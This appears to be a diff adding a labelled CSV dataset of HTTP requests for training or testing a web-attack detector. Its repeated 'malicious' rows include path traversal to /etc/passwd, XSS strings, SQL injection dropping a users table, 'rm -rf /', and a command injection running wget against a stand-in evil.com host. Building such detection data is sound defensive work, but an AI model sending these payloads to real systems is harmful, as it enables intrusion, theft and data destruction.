@@ -1,0 +1,428 @@
+request_data,label
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /../../../../etc/passwd HTTP/1.1,malicious
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+GET /api/data?id=15 HTTP/1.1,normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+GET /images/logo.png HTTP/1.1,normal
+GET /../../../../etc/passwd HTTP/1.1,malicious
+GET /home HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+GET /about HTTP/1.1 Host:example.com,normal
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /contact HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /about HTTP/1.1 Host:example.com,normal
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+GET /blog HTTP/1.1 Host:example.com,normal
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+GET /home HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+GET /images/logo.png HTTP/1.1,normal
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /api/data?id=15 HTTP/1.1,normal
+GET /home HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /config HTTP/1.1
+rm -rf /",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+GET /api/data?id=15 HTTP/1.1,normal
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+GET /home HTTP/1.1 Host:example.com,normal
+GET /../../../../etc/passwd HTTP/1.1,malicious
+GET /images/logo.png HTTP/1.1,normal
+GET /api/data?id=15 HTTP/1.1,normal
+"POST /config HTTP/1.1
+rm -rf /",malicious
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+GET /../../../../etc/passwd HTTP/1.1,malicious
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /home HTTP/1.1 Host:example.com,normal
+GET /images/logo.png HTTP/1.1,normal
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /images/logo.png HTTP/1.1,normal
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /images/logo.png HTTP/1.1,normal
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /config HTTP/1.1
+rm -rf /",malicious
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /images/logo.png HTTP/1.1,normal
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /images/logo.png HTTP/1.1,normal
+"POST /config HTTP/1.1
+rm -rf /",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /blog HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+GET /blog HTTP/1.1 Host:example.com,normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+GET /api/data?id=15 HTTP/1.1,normal
+GET /images/logo.png HTTP/1.1,normal
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /home HTTP/1.1 Host:example.com,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /config HTTP/1.1
+rm -rf /",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+GET /../../../../etc/passwd HTTP/1.1,malicious
+GET /home HTTP/1.1 Host:example.com,normal
+GET /contact HTTP/1.1 Host:example.com,normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+"POST /config HTTP/1.1
+rm -rf /",malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+GET /api/data?id=15 HTTP/1.1,normal
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /config HTTP/1.1
+rm -rf /",malicious
+GET /api/data?id=15 HTTP/1.1,normal
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /api/data?id=15 HTTP/1.1,normal
+GET /blog HTTP/1.1 Host:example.com,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /api/data?id=15 HTTP/1.1,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /contact HTTP/1.1 Host:example.com,normal
+"POST /config HTTP/1.1
+rm -rf /",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+GET /images/logo.png HTTP/1.1,normal
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+GET /images/logo.png HTTP/1.1,normal
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+GET /home HTTP/1.1 Host:example.com,normal
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+GET /home HTTP/1.1 Host:example.com,normal
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+GET /home HTTP/1.1 Host:example.com,normal
+GET /images/logo.png HTTP/1.1,normal
+GET /home HTTP/1.1 Host:example.com,normal
+GET /images/logo.png HTTP/1.1,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /config HTTP/1.1
+rm -rf /",malicious
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /blog HTTP/1.1 Host:example.com,normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+GET /home HTTP/1.1 Host:example.com,normal
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+GET /api/data?id=15 HTTP/1.1,normal
+GET /blog HTTP/1.1 Host:example.com,normal
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+"POST /config HTTP/1.1
+rm -rf /",malicious
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+GET /images/logo.png HTTP/1.1,normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+GET /images/logo.png HTTP/1.1,normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+GET /contact HTTP/1.1 Host:example.com,normal
+"POST /api/comments HTTP/1.1
+comment=<svg onload=alert(2)>",malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /config HTTP/1.1
+rm -rf /",malicious
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+GET /about HTTP/1.1 Host:example.com,normal
+GET /../../../../etc/passwd HTTP/1.1,malicious
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+GET /?q=<img src=x onerror=alert(1)> HTTP/1.1,malicious
+GET /home HTTP/1.1 Host:example.com,normal
+"POST /search HTTP/1.1
+q=<script>malicious()</script>",malicious
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /api/settings HTTP/1.1
+data=;wget http://evil.com/malware.sh",malicious
+"POST /upload.php HTTP/1.1
+payload=<script>alert(1)</script>",malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+GET /blog HTTP/1.1 Host:example.com,normal
+GET /blog HTTP/1.1 Host:example.com,normal
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+"POST /api/comments HTTP/1.1
+comment=Nice+post!",normal
+"POST /register HTTP/1.1
+username=newuser&password=secure123",normal
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /login HTTP/1.1 Host:example.com
+username=user&password=pass",normal
+GET /products?page=1 HTTP/1.1 Host:example.com,normal
+"POST /login HTTP/1.1
+<script>stealCookies()</script>",malicious
+GET /about HTTP/1.1 Host:example.com,normal
+"POST /config HTTP/1.1
+rm -rf /",malicious
+GET /home HTTP/1.1 Host:example.com,normal
+"POST /admin HTTP/1.1
+cmd=rm -rf /",malicious
+"POST /api/delete HTTP/1.1
+id=1; DROP TABLE users;",malicious
+"POST /config HTTP/1.1
+rm -rf /",malicious
